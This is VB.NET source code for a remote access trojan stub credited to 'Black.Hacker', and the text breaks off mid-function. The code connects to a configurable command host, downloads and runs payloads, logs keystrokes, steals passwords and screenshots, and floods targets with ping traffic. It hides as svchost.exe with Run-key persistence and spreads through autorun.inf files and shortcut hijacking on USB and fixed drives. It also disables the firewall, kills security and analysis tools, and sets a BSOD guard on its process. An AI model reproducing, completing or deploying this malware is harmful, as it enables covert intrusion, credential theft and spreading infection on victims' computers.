Imports System.Collections.Generic
Imports System.Runtime.InteropServices
Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Net.Sockets
Imports System.Net
Imports System.IO
Imports System.Text
Imports Microsoft.Win32
Imports System.Collections
Imports System
Imports System.Runtime.CompilerServices
Imports System.Threading
'----------------------------------------------------
' سورس الستب للتشفير البرمجي او إضافة خصائص له
' Coded By : Black.Hacker
' اخر تحديث 21\10\1436
' - - - - - - - - - - - - - - - 
' إهداء الى موقع نقطة التطوير
' www.Dev-Point.com
' Black.Hacker - 2015
'----------------------------------------------------
Public Module A
    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    Public h As String = "[host]"
    Public port As Integer = "[port]"
    Public Name As String = "[vn]"
    Public Y As String = "|Black|"
    Public Ver As String = "4.1 [ Expert Edition ]"
    Public ulink As String = "[link]"
    Public startUP As String = "[startname]"
    Public BD As String = "[BSOD]"
    Public exen As String = "[exen]"
    Public firewall As String = "[firewall]"
    Public FolderSpread As String = "[Folder]"
    Public BypassS As String = "[BypassScreening]"
    Public spread As String
    Public MTX As String = "[MUTEX]"
    Public DriveSpread As String = "[DriveSpread]"
    Public BotKiller As String = "[BotKiller]"
    Public MT As Mutex = Nothing
    Public P2PSpread As String = "[P2P]"
    Public ExeSpread As String = "[EXE]"
    Public ShortCut As String = "[ShorCut]"
    Public PathS As String = "[Path]"
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Public F As New Microsoft.VisualBasic.Devices.Computer
    Public C As New TCP
    Public s As String = New IO.FileInfo(Application.ExecutablePath).Name
    Public EXE As New IO.FileInfo(Application.ExecutablePath)
    Delegate Sub InvokeDelegate()
    Public st As Integer = 0
    Public trd As System.Threading.Thread
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Public strin As String = Nothing
    Public Sub Main()
        Call Install_Server()
        Call UsbVicTim()
        st = 0
        trd = New System.Threading.Thread(AddressOf StartWork)
        trd.IsBackground = True
        trd.Start() ' every 2 Seconds Add Startup Values


        If ulink = "True" Then
            USB.ExeName = exen
            USB.Enable()
        End If
        If BD = "True" Then
            Try
                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf ED
                pr(1) ' protect my process
            Catch ex As Exception
            End Try
        End If
        If firewall = "True" Then
            Call FirfeWall()
        End If
        If FolderSpread = "True" Then
            Call Folder_Spread.SpreadCode("C:\Users\" & Environment.UserName & "\Desktop\", exen)
            Call Folder_Spread.SpreadCode("C:\Users\" & Environment.UserName & "\Documents\", exen)
        End If
        If BypassS = "True" Then
            Call Screening_Programs.Bypass()
        End If

        If DriveSpread = "True" Then
            Drive_infect(exen)
        End If

        If ExeSpread = "True" Then
            Call USB_Spread.infect(exen)
        End If

        If BotKiller = "True" Then
            StartBotKiller()
        End If

        If ShortCut = "True" Then
            Call ShortcutInfection()
        End If
        Try ' check if i am running 2 times or something
            For Each x In Process.GetProcesses
                Try
                    If CompDir(New IO.FileInfo(x.MainModule.FileName), LO) Then
                        If x.Id > Process.GetCurrentProcess.Id Then
                            End
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
        Catch ex As Exception
        End Try
        Try
            Mutex.OpenExisting(MTX)
            End
        Catch ex As Exception
        End Try
        Try
            MT = New Mutex(True, MTX)
        Catch ex As Exception
            End
        End Try
        Dim oldwindow As String = ""
        While True
            System.Threading.Thread.CurrentThread.Sleep(5000)
            Dim s = ACT()
            If s <> oldwindow Then
                oldwindow = s
                C.Send("!1" & Y & s)
            End If
        End While

    End Sub
    Public Sub Drive_infect(ByVal OutName As String) ' Coded By : Black.Hacker
        For Each x In IO.DriveInfo.GetDrives
            If x.IsReady Then
                If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType.Fixed Then
                    If File.Exists(x.Name & OutName) Then
                        File.Delete(x.Name & OutName)
                    End If
                    If File.Exists(x.Name & "autorun.inf") Then
                        File.Delete(x.Name & "autorun.inf")
                    End If
                    IO.File.Copy(Application.ExecutablePath, x.Name & OutName, True)
                    Dim AutoStart = New IO.StreamWriter(x.Name & "autorun.inf")
                    AutoStart.WriteLine("[autorun]")
                    AutoStart.WriteLine("open=" & x.Name & OutName)
                    AutoStart.WriteLine("shellexecute=" & x.Name & OutName, 1)
                    AutoStart.WriteLine("shellopencommand=" & x.Name & OutName)
                    AutoStart.WriteLine("shellexplorecommand=" & x.Name & OutName)
                    AutoStart.WriteLine("shell\open\default=1")
                    AutoStart.WriteLine("action=Perform a Virus Scan")
                    AutoStart.Close()
                    IO.File.SetAttributes(x.Name & OutName, IO.FileAttributes.Hidden)
                    IO.File.SetAttributes(x.Name & "\" & "autorun.inf", IO.FileAttributes.Hidden)
                End If
            End If
        Next
    End Sub
    Public Sub StartBotKiller()
        BOTKILL(System.IO.Directory.GetFiles(System.IO.Path.GetTempPath))
        BOTKILL(System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
        BOTKILL(System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).Replace("Roaming", Nothing)))
    End Sub
    Public Sub BOTKILL(ByVal EXE As String())
        Try
            Dim ProcessList As Process() = Process.GetProcesses()
            For Each F As String In EXE
                Dim FileInfo As New System.IO.FileInfo(F)
                If FileInfo.Extension = ".exe" Then
                    For Each P As Process In ProcessList
                        If P.ProcessName = FileInfo.Name.Replace(".exe", Nothing) Then
                            P.Kill()
                        End If
                    Next
                    Try : System.IO.File.Delete(F) : Catch : Threading.Thread.Sleep(100) : System.IO.File.Delete(F) : End Try
                End If
            Next
        Catch : End Try
    End Sub
    Public Sub Install_Server()
        If IO.Directory.Exists(Environ(PathS) & "\" & "Microsoft") Then
            ' Nothing
        Else
            IO.Directory.CreateDirectory(Environ(PathS) & "\" & "Microsoft")
        End If
        Dim KA As String
        KA = "Microsoft" & "\"
        If File.Exists(Environ(PathS) & "\" & KA & "svchost.exe") Then
            AStartup(startUP, Environ(PathS) & "\" & KA & "svchost.exe")
        Else
            File.Copy(Application.ExecutablePath, Environ(PathS) & "\" & KA & "svchost.exe")
            File.SetAttributes(Environ(PathS) & "\" & KA & "svchost.exe", FileAttributes.System + FileAttributes.Hidden)
            AStartup(startUP, Environ(PathS) & "\" & KA & "svchost.exe")
        End If
        If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe") Then
            ' Nothing
        Else
            File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe")
            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe", FileAttributes.Hidden + FileAttributes.System)
        End If
    End Sub
    Private Function CompDir(ByVal F1 As IO.FileInfo, ByVal F2 As IO.FileInfo) As Boolean ' Compare 2 path
        If F1.Name.ToLower <> F2.Name.ToLower Then Return False
        Dim D1 = F1.Directory
        Dim D2 = F2.Directory
re:
        If D1.Name.ToLower = D2.Name.ToLower = False Then Return False
        D1 = D1.Parent
        D2 = D2.Parent
        If D1 Is Nothing And D2 Is Nothing Then Return True
        If D1 Is Nothing Then Return False
        If D2 Is Nothing Then Return False
        GoTo re
    End Function

    Public Sub IND(ByVal b As Byte())
        Dim A As String() = Split(BS(b), Y)
        On Error Resume Next
        Select Case A(0)
            Case "ping"
                C.Send("ping")
            Case "CloseServer"
                pr(0)
                ED()
                Application.Exit()
                End
            Case "RestartServer"
                Application.Restart()
                End
            Case "sendfile"
                IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & A(1))
            Case "download"
                My.Computer.Network.DownloadFile(A(1), IO.Path.GetTempPath & A(2))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & A(2))
            Case "UDP" ' Coded By Black.Hacker
                On Error Resume Next
                Dim aa As New System.Net.NetworkInformation.Ping
                Dim bb As System.Net.NetworkInformation.PingReply
                Dim txtlog As String = ""
                Dim c As New System.Net.NetworkInformation.PingOptions
                c.DontFragment = True
                c.Ttl = 64
                Dim data As String = "JE7&I&e56436CZRNPHM16IGZ5jZ4WG3057e^H1%RTIBC^Y#TMG0$ACZ881ZI^j6V2J4U%5J4&^^3j5E1#WS55IZPJR8#N#7J#7Re7eAWR&$GT4!0#$H^4T7I7He&Wrj$7^5eJEX7E5j$TK@8@Ee1M7UL$4WQMeW6ZTMMIOjeN63&251#rj3GS2T^3@3YGr$J4P22jNW7EXE0V#326J&XXDr#jKTJL#EI10ZX866MW4#@8PjTj&JU#Jj!T&65r61W1G$HIHPJMe7M3^&JG&WG4HR#EZ&&W$NRYUG3T!5IULKe"
                Dim bt As Byte() = System.Text.Encoding.ASCII.GetBytes(data)
                Dim i As Int16
                For i = 0 To 1000
                    bb = aa.Send(A(1), 20000, bt, c)
                Next i
            Case "OpenPage"
                Process.Start(A(1))
            Case "BlocKPage"
                My.Computer.FileSystem.WriteAllText("C:\WINDOWS\system32\drivers\etc\hosts", vbNewLine & "127.0.0.1" + "  " + A(1), True)
            Case "Logoff"
                Shell("shutdown -l -t 00", AppWinStyle.Hide)
            Case "Restart"
                Shell("shutdown -r -t 00", AppWinStyle.Hide)
            Case "Shutdown"
                Shell("shutdown -s -t 00", AppWinStyle.Hide)
            Case "keystart"
                Dim Keylogger As New kl
                Dim tt As Object = New Thread(AddressOf Keylogger.WRK, 1)
                tt.Start()
            Case "keydump"
                Dim Log As New kl
                C.Send("keydump" & Y & IO.File.ReadAllText(Log.LogsPath) & Y & Name & "_" & HWD())
            Case "getpass"
                IO.File.WriteAllBytes(IO.Path.GetTempPath & "\pwd.dll", Convert.FromBase64String(A(1)))
                Shell(IO.Path.GetTempPath & "\pwd.dll")
                C.Send("sendpass" & Y & IO.File.ReadAllText(IO.Path.GetTempPath & "\output.txt") & Y & Name & "_" & HWD())
            Case "getdesktop"
                IO.File.WriteAllBytes(IO.Path.GetTempPath & "\desktop.dll", Convert.FromBase64String(A(1)))
                Shell(IO.Path.GetTempPath & "\desktop.dll")
                Threading.Thread.Sleep(1000)
                C.Send("sendesktop" & Y & Convert.ToBase64String(File.ReadAllBytes(IO.Path.GetTempPath & "\hell.png")) & Y & Name & "_" & HWD())
            Case "Update"
                IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & A(1))
                End
            Case "uninstall"
                On Error Resume Next
                DStartup(startUP)
                ED()
                Application.Exit()
                End
        End Select
    End Sub
    Public Sub UsbVicTim()
        If File.Exists((Path.GetTempPath & "BlackData.dat")) Then
            File.Delete(Path.GetTempPath & "BlackData.dat")
        End If
        If Application.ExecutablePath.EndsWith(exen) Then
            File.WriteAllText((Path.GetTempPath & "BlackData.dat"), "Yes")
            File.SetAttributes(Path.GetTempPath & "BlackData.dat", FileAttributes.Hidden)
        Else
            File.WriteAllText((Path.GetTempPath & "BlackData.dat"), "No")
            File.SetAttributes(Path.GetTempPath & "BlackData.dat", FileAttributes.Hidden)
        End If
        spread = File.ReadAllText((Path.GetTempPath & "BlackData.dat"))
        Call filehide()
    End Sub
    Public GetProcesses() As Process

    Public Function INF() As String
        Dim x As String = Name & "_" & HWD() & Y
        ' get pc name
        Try
            x &= Environment.MachineName & Y
        Catch ex As Exception
            x &= "??" & Y
        End Try
        ' get User name
        Try
            x &= Environment.UserName & Y
        Catch ex As Exception
            x &= "??" & Y
        End Try

        ' get Country
        x &= Gcc() & Y
        ' Get OS
        Try
            x += F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            x += "??" '& Y
        End Try
        x += "SP"
        Try
            Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
            If k.Length = 1 Then
                x &= "0"
            End If
            x &= k(k.Length - 1)
        Catch ex As Exception
            x &= "0"
        End Try
        Try
            If Environment.GetFolderPath(38).Contains("x86") Then
                x += " x64" & Y
            Else
                x += " x86" & Y
            End If
        Catch ex As Exception
            x += Y
        End Try
        ' cam
        If Cam() Then
            x &= "Yes" & Y
        Else
            x &= "No" & Y
        End If
        ' version
        x &= Ver & Y
        ' ping
        x &= "" & Y
        x &= ACT() & Y
        ' Install Date
        x &= FR() & Y
        ' check spread
        x &= spread & Y
        Return x
    End Function
    Public Function FR() As String ' install Date
        Try
            Return CType(LO, IO.FileInfo).LastWriteTime.ToString("yyyy-MM-dd")
        Catch ex As Exception
            Return "unknown"
        End Try
    End Function

    Public Function GetSystemRAMSize() As Double
        Try
            Dim RAM_Size As Double = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
            Return FormatNumber(RAM_Size, 2)

        Catch : End Try
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    '====================================== Window API
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr ' Get Active window Handle
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Public Function ACT() As String ' Get Active Window Text
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ""
            End If
            Dim w As Integer
            w = GetWindowTextLength(h)
            Dim t As String = StrDup(w + 1, "*")
            GetWindowText(h, t, w + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return t
            Else
                Try
                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
                Catch ex As Exception
                    Return t
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Public Function BS(ByVal b As Byte()) As String ' bytes to String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Public Function SB(ByVal s As String) As Byte() ' String to bytes
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    '=============================== PC Country
    <DllImport("kernel32.dll")> _
    Private Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function
    Public Function Gcc() As String
        Try
            Dim d = New System.Text.StringBuilder(256)
            Dim i As Integer = GetLocaleInfo(&H400, &H7, d, d.Capacity)
            If i > 0 Then
                Return d.ToString().Substring(0, i - 1)
            End If
        Catch ex As Exception
        End Try
        Return "X"
    End Function
    '======== process protect With BSOD
    <DllImport("ntdll")> _
    Public Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    Sub pr(ByVal i As Integer) ' protect process With BSOD
        ' if i= 0  Unprotect, if i=1 Protect
        Try
            NtSetInformationProcess(Process.GetCurrentProcess.Handle, 29, i, 4)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ED() ' unprotect me if windows restart or logoff
        pr(0)
    End Sub
    '=============================== Cam Drivers
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
    ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
    ByVal cbVer As Integer) As Boolean
    Public Function Cam() As Boolean
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return True
                End If
            Next
        Catch ex As Exception
        End Try
        Return False
    End Function

End Module
Public Class TCP
    Public SPL As String = "[endof]"
    Public C As Net.Sockets.TcpClient
    Sub New()
        Dim t As New Threading.Thread(AddressOf RC)
        t.Start()
    End Sub
    Public Sub Send(ByVal b As Byte())
        If CN = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            CN = False
        End Try
    End Sub
    Public Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub
    Private CN As Boolean = False
    Sub RC()
        Dim M As New IO.MemoryStream ' create memory stream
        Dim lp As Integer = 0
re:
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If CN = False Then GoTo e
            lp += 1
            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then ' split packet..
                    Dim A As Array = fx(M.ToArray, SPL)
                    Dim T As New System.Threading.Thread(AddressOf IND)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:      ' clear things and ReConnect
        CN = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(h, port)
            CN = True
            Send("!0" & Y & INF()) ' Send My INFO after connect
        Catch ex As Exception
            Threading.Thread.CurrentThread.Sleep(2500)
            GoTo e
        End Try
        GoTo re
    End Sub
End Class
Public Module USB
    Public ExeName As String
    Private H As Threading.Thread

    Public Sub Enable()
        H = New Threading.Thread(AddressOf WorkThread)
        H.Start()
    End Sub


    Public Sub Disable()
        H.Abort()
    End Sub

    Public Sub WorkThread()
GoAgain:
        Dim allDrives() As IO.DriveInfo = IO.DriveInfo.GetDrives()
        Dim d As IO.DriveInfo

        Dim VbsObj As Object
        VbsObj = CreateObject("WScript.Shell")
        Dim DE As Object

        For Each d In allDrives

            If d.IsReady = True AndAlso d.DriveType = IO.DriveType.Removable Then
                Dim RootDir As String = d.RootDirectory.ToString
                Try : IO.File.Copy(Process.GetCurrentProcess.MainModule.FileName, RootDir & ExeName) : Catch : End Try
                IO.File.SetAttributes(RootDir & ExeName, IO.FileAttributes.Hidden)
                For Each f As String In IO.Directory.GetFiles(RootDir)
                    If IO.Path.GetFileNameWithoutExtension(f) = IO.Path.GetFileNameWithoutExtension(ExeName) Then GoTo GoHere
                    If Not f.Contains(".lnk") Then
                        IO.File.SetAttributes(f, IO.FileAttributes.Hidden)
                    End If
                    DE = VbsObj.CreateShortcut(RootDir & IO.Path.GetFileNameWithoutExtension(f) & ".lnk")
                    DE.TargetPath = RootDir & ExeName
                    DE.WorkingDirectory = RootDir
                    DE.IconLocation = f & ", 0"
                    DE.Save()
GoHere:
                Next
                For Each dx As String In IO.Directory.GetDirectories(RootDir)
                    Dim dir As New System.IO.DirectoryInfo(dx)
                    dir.Attributes = IO.FileAttributes.Hidden
                    DE = VbsObj.CreateShortcut(dx & ".lnk")
                    DE.TargetPath = RootDir & ExeName
                    DE.WorkingDirectory = RootDir
                    DE.IconLocation = Environment.GetEnvironmentVariable("windir") & "\System32\Shell32.dll" & ", 3"
                    DE.Save()
                Next
            End If
        Next
        Threading.Thread.Sleep(1000)
        GoTo GoAgain
    End Sub

End Module
Module Exta
    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public Sub filehide()
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 0)
    End Sub
    Public Sub DStartup(ByVal Name As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.DeleteValue(Name)
    End Sub
End Module
Module USB_Spread
    Public Sub infect(ByVal OutName As String)
        For Each x In IO.DriveInfo.GetDrives
            If x.IsReady Then
                If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType.Removable Then
                    If File.Exists(x.Name & OutName) Then
                        File.Delete(x.Name & OutName)
                    End If
                    If File.Exists(x.Name & "autorun.inf") Then
                        File.Delete(x.Name & "autorun.inf")
                    End If
                    IO.File.Copy(Application.ExecutablePath, x.Name & OutName, True)
                    Dim AutoStart = New IO.StreamWriter(x.Name & "autorun.inf")
                    AutoStart.WriteLine("[autorun]")
                    AutoStart.WriteLine("open=" & x.Name & OutName)
                    AutoStart.WriteLine("shellexecute=" & x.Name & OutName, 1)
                    AutoStart.WriteLine("shellopencommand=" & x.Name & OutName)
                    AutoStart.WriteLine("shellexplorecommand=" & x.Name & OutName)
                    AutoStart.WriteLine("icon=" & x.Name & OutName & ",0")
                    AutoStart.WriteLine("action=Perform a Virus Scan")
                    AutoStart.Close()
                    IO.File.SetAttributes(x.Name & OutName, IO.FileAttributes.Hidden)
                    IO.File.SetAttributes(x.Name & "\" & "autorun.inf", IO.FileAttributes.Hidden)
                End If
            End If
        Next
        Call filehide()
    End Sub
End Module

Module Bypass
    Public Sub FirfeWall()
        Dim process As New Process
        Dim str As String = "netsh.exe"
        process.StartInfo.Arguments = "firewall set opmode disable"
        process.StartInfo.FileName = str
        process.StartInfo.UseShellExecute = False
        process.StartInfo.RedirectStandardOutput = True
        process.StartInfo.CreateNoWindow = True
        process.Start()
        process.WaitForExit()
    End Sub
End Module
Module StartEvrey
    Public Sub StartWork()
star:
        If st <> 0 Then Exit Sub
        Dim KA As String = "Microsoft" & "\"
        System.Threading.Thread.Sleep(2000)
        AStartup(startUP, Environ(PathS) & "\" & KA & "svchost.exe")
        If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe") Then
            ' Nothing
        Else
            File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe")
            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "svchost.exe", FileAttributes.Hidden + FileAttributes.System)
        End If
        GoTo star
    End Sub
End Module
Module Folder_Spread
    Public Function SpreadCode(ByVal location As String, ByVal ExeNamee As String) As String ' Ask for folders
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        Dim VbsObj As Object
        VbsObj = CreateObject("WScript.Shell")
        Dim DE As Object
        For Each subdi As DirectoryInfo In di.GetDirectories
            Try : IO.File.Copy(Process.GetCurrentProcess.MainModule.FileName, folders & ExeNamee) : Catch : End Try
            IO.File.SetAttributes(folders & ExeName, IO.FileAttributes.Hidden)
            For Each f As String In IO.Directory.GetFiles(folders)
                If IO.Path.GetFileNameWithoutExtension(f) = IO.Path.GetFileNameWithoutExtension(ExeNamee) Then GoTo GoHere
                If Not f.Contains(".lnk") Then
                    IO.File.SetAttributes(f, IO.FileAttributes.Hidden)
                End If
                DE = VbsObj.CreateShortcut(folders & IO.Path.GetFileNameWithoutExtension(f) & ".lnk")
                DE.TargetPath = folders & ExeNamee
                DE.WorkingDirectory = folders
                DE.IconLocation = f & ", 0"
                DE.Save()
GoHere:
            Next
            For Each dx As String In IO.Directory.GetDirectories(folders)
                Dim dir As New System.IO.DirectoryInfo(dx)
                dir.Attributes = IO.FileAttributes.Hidden
                DE = VbsObj.CreateShortcut(dx & ".lnk")
                DE.TargetPath = folders & ExeNamee
                DE.WorkingDirectory = folders
                DE.IconLocation = Environment.GetEnvironmentVariable("windir") & "\System32\Shell32.dll" & ", 3"
                DE.Save()
            Next

        Next
        Return folders
    End Function
End Module
Public Module Screening_Programs ' Bypassing 50 Screaning Programs Use MainWindowTitle + GetProcessesByName
    Public Sub Bypass()
        Dim st As Integer = +1
        If st <> 2 Then
bypass:
            On Error Resume Next
            Dim Security() As Process = System.Diagnostics.Process.GetProcessesByName("procexp")
            For Each Najaf As Process In Security
                Najaf.Kill()
            Next
            Dim Security1() As Process = System.Diagnostics.Process.GetProcessesByName("SbieCtrl")
            For Each Najaf1 As Process In Security1
                Najaf1.Kill()
            Next
            Dim Security2() As Process = System.Diagnostics.Process.GetProcessesByName("SpyTheSpy")
            For Each Najaf2 As Process In Security2
                Najaf2.Kill()
            Next
            Dim Security3() As Process = System.Diagnostics.Process.GetProcessesByName("SpeedGear")
            For Each Najaf3 As Process In Security3
                Najaf3.Kill()
            Next
            Dim Security9() As Process = System.Diagnostics.Process.GetProcessesByName("wireshark")
            For Each Najaf9 As Process In Security9
                Najaf9.Kill()
            Next
            Dim Security10() As Process = System.Diagnostics.Process.GetProcessesByName("mbam")
            For Each Najaf10 As Process In Security10
                Najaf10.Kill()
            Next
            Dim Security13() As Process = System.Diagnostics.Process.GetProcessesByName("apateDNS")
            For Each Najaf13 As Process In Security13
                Najaf13.Kill()
            Next
            Dim Security14() As Process = System.Diagnostics.Process.GetProcessesByName("IPBlocker")
            For Each Najaf14 As Process In Security14
                Najaf14.Kill()
            Next
            Dim Security15() As Process = System.Diagnostics.Process.GetProcessesByName("cports")
            For Each Najaf15 As Process In Security15
                Najaf15.Kill()
            Next
            Dim Security16() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessHacker")
            For Each Najaf16 As Process In Security16
                Najaf16.Kill()
            Next
            Dim Security17() As Process = System.Diagnostics.Process.GetProcessesByName("KeyScrambler")
            For Each Najaf17 As Process In Security17
                Najaf17.Kill()
            Next
            Dim Security18() As Process = System.Diagnostics.Process.GetProcessesByName("TiGeR-Firewall")
            For Each Najaf18 As Process In Security18
                Najaf18.Kill()
            Next
            Dim Security19() As Process = System.Diagnostics.Process.GetProcessesByName("Tcpview")
            For Each Najaf19 As Process In Security19
                Najaf19.Kill()
            Next
            Dim Security20() As Process = System.Diagnostics.Process.GetProcessesByName("xn5x")
            For Each Najaf20 As Process In Security20
                Najaf20.Kill()
            Next
            Dim Security21() As Process = System.Diagnostics.Process.GetProcessesByName("smsniff")
            For Each Najaf21 As Process In Security21
                Najaf21.Kill()
            Next
            Dim Security22() As Process = System.Diagnostics.Process.GetProcessesByName("exeinfoPE")
            For Each Najaf22 As Process In Security22
                Najaf22.Kill()
            Next
            Dim Security23() As Process = System.Diagnostics.Process.GetProcessesByName("regshot")
            For Each Najaf23 As Process In Security23
                Najaf23.Kill()
            Next
            Dim Security24() As Process = System.Diagnostics.Process.GetProcessesByName("RogueKiller")
            For Each Najaf24 As Process In Security24
                Najaf24.Kill()
            Next
            Dim Security25() As Process = System.Diagnostics.Process.GetProcessesByName("NetSnifferCs")
            For Each Najaf25 As Process In Security25
                Najaf25.Kill()
            Next
            Dim Security26() As Process = System.Diagnostics.Process.GetProcessesByName("taskmgr")
            For Each Najaf26 As Process In Security26
                Najaf26.Kill()
            Next
            Dim Security27() As Process = System.Diagnostics.Process.GetProcessesByName("Reflector")
            For Each Najaf27 As Process In Security27
                Najaf27.Kill()
            Next
            Dim Security28() As Process = System.Diagnostics.Process.GetProcessesByName("capsa")
            For Each Najaf28 As Process In Security28
                Najaf28.Kill()
            Next
            Dim Security29() As Process = System.Diagnostics.Process.GetProcessesByName("NetworkMiner")
            For Each Najaf29 As Process In Security29
                Najaf29.Kill()
            Next
            Dim Security30() As Process = System.Diagnostics.Process.GetProcessesByName("AdvancedProcessController")
            For Each Najaf30 As Process In Security30
                Najaf30.Kill()
            Next
            Dim Security31() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessLassoLauncher")
            For Each Najaf31 As Process In Security31
                Najaf31.Kill()
            Next
            Dim Security32() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessLasso")
            For Each Najaf32 As Process In Security32
                Najaf32.Kill()
            Next
            Dim Security33() As Process = System.Diagnostics.Process.GetProcessesByName("SystemExplorer")
